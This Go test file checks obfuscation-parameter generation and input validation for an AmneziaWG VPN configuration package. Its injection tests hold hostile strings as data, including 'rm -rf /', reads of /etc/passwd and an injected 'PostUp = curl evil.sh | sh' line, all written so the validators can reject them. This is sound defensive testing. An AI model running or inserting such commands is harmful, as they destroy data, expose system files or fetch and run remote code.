package amneziawg

import (
	"encoding/base64"
	"strconv"
	"strings"
	"testing"
)

func TestGenerateObfuscation31DefaultRanges(t *testing.T) {
	for i := 0; i < 200; i++ {
		o := GenerateObfuscation31()
		if o.Jc < 3 || o.Jc > 6 {
			t.Fatalf("Jc = %d, want [3,6]", o.Jc)
		}
		if o.Jmin < 40 || o.Jmin > 89 {
			t.Fatalf("Jmin = %d, want [40,89]", o.Jmin)
		}
		if o.Jmax < o.Jmin+50 || o.Jmax > o.Jmin+250 {
			t.Fatalf("Jmax = %d, want [Jmin+50, Jmin+250] (Jmin=%d)", o.Jmax, o.Jmin)
		}
		if o.S1 < 15 || o.S1 > 150 {
			t.Fatalf("S1 = %d, want [15,150]", o.S1)
		}
		if o.S2 < 15 || o.S2 > 150 {
			t.Fatalf("S2 = %d, want [15,150]", o.S2)
		}
		if o.S1+56 == o.S2 {
			t.Fatalf("S1+56 == S2 (%d+56 == %d): violates kernel constraint", o.S1, o.S2)
		}
		if o.S3 < 12 || o.S3 > 55 {
			t.Fatalf("S3 = %d, want [12,55]", o.S3)
		}
		if o.S4 < 12 || o.S4 > 27 {
			t.Fatalf("S4 = %d, want [12,27]", o.S4)
		}
		if o.HeaderProtectionKey != "" {
			if err := ValidateObfuscation(o); err != nil {
				t.Fatalf("generated set failed its own validation: %v", err)
			}
		}
		for name, h := range map[string]string{"H1": o.H1, "H2": o.H2, "H3": o.H3, "H4": o.H4} {
			if err := validateUintRange(h, 0); err != nil {
				t.Fatalf("%s = %q invalid: %v", name, h, err)
			}
			if h == "" {
				t.Fatalf("%s is empty, want a generated range", name)
			}
		}
		if !strings.HasPrefix(o.I1, "<r ") || !strings.HasSuffix(o.I1, ">") {
			t.Fatalf("I1 = %q, want \"<r N>\" form", o.I1)
		}
		n, err := strconv.Atoi(strings.TrimSuffix(strings.TrimPrefix(o.I1, "<r "), ">"))
		if err != nil || n < 32 || n > 256 {
			t.Fatalf("I1 = %q, embedded N must be an integer in [32,256]", o.I1)
		}
		for name, v := range map[string]string{"I2": o.I2, "I3": o.I3, "I4": o.I4, "I5": o.I5} {
			if v != "" {
				t.Fatalf("%s = %q, generated sets must leave I2-I5 empty", name, v)
			}
		}
		key, err := base64.StdEncoding.DecodeString(o.HeaderProtectionKey)
		if err != nil || len(key) != 32 {
			t.Fatalf("HeaderProtectionKey = %q, must be base64 of 32 bytes (err=%v)", o.HeaderProtectionKey, err)
		}
		assertRangeWithin(t, "ContentPaddingAddition", o.ContentPaddingAddition, 8, 64)
		rkLo, rkHi := assertRangeWithin(t, "RekeyAfterTime", o.RekeyAfterTime, 100, 160)
		if rkHi-rkLo < 10 || rkHi-rkLo > 40 {
			t.Fatalf("RekeyAfterTime = %q, width must be in [10,40]", o.RekeyAfterTime)
		}
		rjLo, _ := assertRangeWithin(t, "RejectAfterTime", o.RejectAfterTime, 130, 310)
		if rjLo < rkHi+30 {
			t.Fatalf("RejectAfterTime = %q must start >= 30s above RekeyAfterTime max %d", o.RejectAfterTime, rkHi)
		}
		assertRangeWithin(t, "RekeyTimeout", o.RekeyTimeout, 3, 10)
		assertRangeWithin(t, "KeepaliveTimeout", o.KeepaliveTimeout, 8, 20)
		assertRangeWithin(t, "MaxHandshakeAttempts", o.MaxHandshakeAttempts, 15, 50)
		if !o.RandomTrailers || !o.DisableCookies {
			t.Fatalf("RandomTrailers/DisableCookies = %v/%v, generated sets default both on", o.RandomTrailers, o.DisableCookies)
		}
	}
}

// assertRangeWithin parses a "lo-hi" value and fails unless
// min <= lo <= hi <= max, returning the parsed bounds.
func assertRangeWithin(t *testing.T, name, v string, min, max int64) (lo, hi int64) {
	t.Helper()
	lo, hi, ok := parseUintRange(v)
	if !ok || !strings.Contains(v, "-") {
		t.Fatalf("%s = %q, want a lo-hi range", name, v)
	}
	if lo < min || hi > max || lo > hi {
		t.Fatalf("%s = %q, want %d <= lo <= hi <= %d", name, v, min, max)
	}
	return lo, hi
}

func TestGenerateHRangesNonOverlapping(t *testing.T) {
	for i := 0; i < 50; i++ {
		h := generateHRanges()
		var prevHi int64
		for i, r := range h {
			lo, hi, ok := strings.Cut(r, "-")
			if !ok {
				t.Fatalf("H%d = %q is not a range", i+1, r)
			}
			loN, _ := strconv.ParseInt(lo, 10, 64)
			hiN, _ := strconv.ParseInt(hi, 10, 64)
			if loN <= prevHi {
				t.Fatalf("H%d = %q overlaps or touches the previous range (prev high=%d)", i+1, r, prevHi)
			}
			if hiN-loN < hMinWidth {
				t.Fatalf("H%d = %q is narrower than hMinWidth=%d", i+1, r, hMinWidth)
			}
			prevHi = hiN
		}
	}
}

func validObfuscation() Obfuscation31 {
	return GenerateObfuscation31()
}

func TestValidateObfuscationAcceptsGenerated(t *testing.T) {
	for i := 0; i < 50; i++ {
		if err := ValidateObfuscation(validObfuscation()); err != nil {
			t.Fatalf("generated obfuscation set rejected: %v", err)
		}
	}
}

func TestValidateObfuscationAcceptsBlankH(t *testing.T) {
	o := validObfuscation()
	o.H1, o.H2, o.H3, o.H4 = "", "", "", ""
	if err := ValidateObfuscation(o); err != nil {
		t.Fatalf("blank H values should be allowed (fall back to defaults): %v", err)
	}
}

func TestValidateObfuscationRejectsBadJminJmax(t *testing.T) {
	o := validObfuscation()
	o.Jmin, o.Jmax = 50, 10
	if err := ValidateObfuscation(o); err == nil {
		t.Fatal("Jmin > Jmax must be rejected")
	}
}

func TestValidateObfuscationRejectsBadS3S4(t *testing.T) {
	o := validObfuscation()
	o.S3 = 65
	if err := ValidateObfuscation(o); err == nil {
		t.Fatal("S3 > 64 must be rejected")
	}
	o = validObfuscation()
	o.S4 = 33
	if err := ValidateObfuscation(o); err == nil {
		t.Fatal("S4 > 32 must be rejected")
	}
	o = validObfuscation()
	o.S3, o.S4 = -1, -1
	if err := ValidateObfuscation(o); err == nil {
		t.Fatal("negative S3/S4 must be rejected")
	}
}

func TestValidateObfuscationRejectsLowSWithHeaderProtection(t *testing.T) {
	for field, set := range map[string]func(o *Obfuscation31){
		"S1": func(o *Obfuscation31) { o.S1 = 11 },
		"S2": func(o *Obfuscation31) { o.S2 = 11 },
		"S3": func(o *Obfuscation31) { o.S3 = 11 },
		"S4": func(o *Obfuscation31) { o.S4 = 11 },
	} {
		o := validObfuscation()
		set(&o)
		if err := ValidateObfuscation(o); err == nil {
			t.Fatalf("%s = 11 with a header protection key set must be rejected", field)
		}
	}
	o := validObfuscation()
	o.HeaderProtectionKey = ""
	o.S3, o.S4 = 8, 4
	if err := ValidateObfuscation(o); err != nil {
		t.Fatalf("S3/S4 below 12 with no header protection key must be accepted: %v", err)
	}
}

func TestValidateObfuscationRejectsS1S2Collision(t *testing.T) {
	o := validObfuscation()
	o.S1 = 30
	o.S2 = o.S1 + 56
	if err := ValidateObfuscation(o); err == nil {
		t.Fatal("S1+56 == S2 must be rejected (kernel constraint)")
	}
}

func TestValidateObfuscationRejectsBadH(t *testing.T) {
	cases := []string{"not-a-number", "10-", "-10", "5-4", "-1-10"}
	for _, h := range cases {
		o := validObfuscation()
		o.H1 = h
		if err := ValidateObfuscation(o); err == nil {
			t.Fatalf("H1 = %q must be rejected", h)
		}
	}
}

func TestValidateObfuscationAcceptsEmpty31Fields(t *testing.T) {
	o := validObfuscation()
	o.HeaderProtectionKey = ""
	o.ContentPaddingAddition = ""
	o.RekeyAfterTime, o.RekeyTimeout, o.RejectAfterTime = "", "", ""
	o.KeepaliveTimeout, o.MaxHandshakeAttempts = "", ""
	o.RandomTrailers, o.DisableCookies = false, false
	if err := ValidateObfuscation(o); err != nil {
		t.Fatalf("all-empty 3.1 fields must be accepted (features off): %v", err)
	}
}

func TestValidateObfuscationRejectsBadTimingRanges(t *testing.T) {
	cases := []struct {
		name   string
		mutate func(o *Obfuscation31)
	}{
		{"zero rekeyTimeout", func(o *Obfuscation31) { o.RekeyTimeout = "0" }},
		{"zero-low range", func(o *Obfuscation31) { o.KeepaliveTimeout = "0-10" }},
		{"inverted range", func(o *Obfuscation31) { o.RekeyAfterTime = "160-100" }},
		{"non-numeric", func(o *Obfuscation31) { o.MaxHandshakeAttempts = "many" }},
		{"trailing dash", func(o *Obfuscation31) { o.RejectAfterTime = "200-" }},
		{"rekey max not below reject min", func(o *Obfuscation31) {
			o.RekeyAfterTime = "100-200"
			o.RejectAfterTime = "200-300"
		}},
		{"single rekey value at reject min", func(o *Obfuscation31) {
			o.RekeyAfterTime = "180"
			o.RejectAfterTime = "180-300"
		}},
		{"embedded newline splits the config line", func(o *Obfuscation31) {
			o.RekeyAfterTime = "110\n-140"
			o.RejectAfterTime = "190-250"
		}},
		{"reject alone below the 120s default rekey", func(o *Obfuscation31) {
			o.RekeyAfterTime = ""
			o.RejectAfterTime = "30-60"
		}},
		{"rekey alone above the 180s default reject", func(o *Obfuscation31) {
			o.RekeyAfterTime = "200-300"
			o.RejectAfterTime = ""
		}},
	}
	for _, c := range cases {
		o := validObfuscation()
		c.mutate(&o)
		if err := ValidateObfuscation(o); err == nil {
			t.Errorf("%s must be rejected", c.name)
		}
	}
}

func TestValidateObfuscationRejectsBadHeaderProtectionKey(t *testing.T) {
	cases := []struct {
		name string
		key  string
	}{
		{"not base64", "not!!!base64"},
		{"16-byte key", base64.StdEncoding.EncodeToString(make([]byte, 16))},
		{"33-byte key", base64.StdEncoding.EncodeToString(make([]byte, 33))},
		{"control characters", "AAAA\nBBBB"},
		// DecodeString IGNORES \r\n, so this decodes to a valid 32 bytes —
		// only the explicit control-character check can catch the line wrap.
		{"line-wrapped but decodable key", "MCPfRGcDGotJ6Tcn\r\nIdDqsemj2cMIiGHnPUHM5ivXN18="},
	}
	for _, c := range cases {
		o := validObfuscation()
		o.HeaderProtectionKey = c.key
		if err := ValidateObfuscation(o); err == nil {
			t.Errorf("headerProtectionKey %s (%q) must be rejected", c.name, c.key)
		}
	}
}

func TestCanonicalizeUintRange(t *testing.T) {
	cases := []struct{ in, want string }{
		{"110 - 140", "110-140"},
		{"  120  ", "120"},
		{"   ", ""},
		{"", ""},
		{"110-140", "110-140"},
	}
	for _, c := range cases {
		if got := CanonicalizeUintRange(c.in); got != c.want {
			t.Errorf("CanonicalizeUintRange(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

func TestValidateObfuscationAcceptsSingleValueRanges(t *testing.T) {
	o := validObfuscation()
	o.ContentPaddingAddition = "32"
	o.RekeyAfterTime = "120"
	o.RejectAfterTime = "180"
	if err := ValidateObfuscation(o); err != nil {
		t.Fatalf("single-integer values must be accepted like the awg parser does: %v", err)
	}
}

func TestValidateInterfaceNameAcceptsBlankAndPlausibleNames(t *testing.T) {
	for _, name := range []string{"", "eth0", "wg0", "br-lan", "eno1.100", "veth1a2b3c", "eth0:0"} {
		if err := ValidateInterfaceName(name); err != nil {
			t.Errorf("ValidateInterfaceName(%q) rejected a plausible name: %v", name, err)
		}
	}
}

func TestValidateInterfaceNameRejectsShellMetacharactersAndOverlength(t *testing.T) {
	cases := []string{
		"eth0 -j ACCEPT; rm -rf /",
		"eth0`whoami`",
		"eth0$(id)",
		"eth0|cat /etc/passwd",
		"eth0\nMASQUERADE",
		"aaaaaaaaaaaaaaaaaaaa", // 20 chars, over IFNAMSIZ-1
	}
	for _, name := range cases {
		if err := ValidateInterfaceName(name); err == nil {
			t.Errorf("ValidateInterfaceName(%q) must be rejected", name)
		}
	}
}

func TestValidateSubnetIPv4AcceptsValidBases(t *testing.T) {
	cases := []struct {
		ip   string
		cidr int
	}{
		{"10.8.1.0", 24},
		{"10.8.1.0", 0}, // cidr <= 0 defaults to /24, mirroring serverAddress
		{"192.168.5.10", 32},
	}
	for _, c := range cases {
		if err := ValidateSubnetIPv4(c.ip, c.cidr); err != nil {
			t.Errorf("ValidateSubnetIPv4(%q, %d) rejected a valid subnet: %v", c.ip, c.cidr, err)
		}
	}
}

func TestValidateSubnetIPv4RejectsMalformedOrInjectedValues(t *testing.T) {
	cases := []struct {
		ip   string
		cidr int
	}{
		{"10.8.1.0 -j ACCEPT; rm -rf /", 24}, // shell injection attempt
		{"not-an-ip", 24},
		{"", 24},
		{"fd86::1", 64},  // IPv6, not IPv4
		{"10.8.1.0", 33}, // cidr out of range
	}
	for _, c := range cases {
		if err := ValidateSubnetIPv4(c.ip, c.cidr); err == nil {
			t.Errorf("ValidateSubnetIPv4(%q, %d) must be rejected", c.ip, c.cidr)
		}
	}
}

func TestValidateConfigValueAcceptsPlausibleValues(t *testing.T) {
	for _, v := range []string{"", "user@example.com", "MCPfRGcDGotJ6TcnIdDqsemj2cMIiGHnPUHM5ivXN18=", "<r 148>"} {
		if err := ValidateConfigValue("email", v); err != nil {
			t.Errorf("ValidateConfigValue(%q) rejected a plausible value: %v", v, err)
		}
	}
}

func TestValidateConfigValueRejectsControlCharacters(t *testing.T) {
	cases := []string{
		"a@x\nPostUp = curl evil.sh | sh",
		"a@x\r\n[Interface]",
		"tab\there",
		"a@x\x7f",
	}
	for _, v := range cases {
		if err := ValidateConfigValue("email", v); err == nil {
			t.Errorf("ValidateConfigValue(%q) must be rejected", v)
		}
	}
}
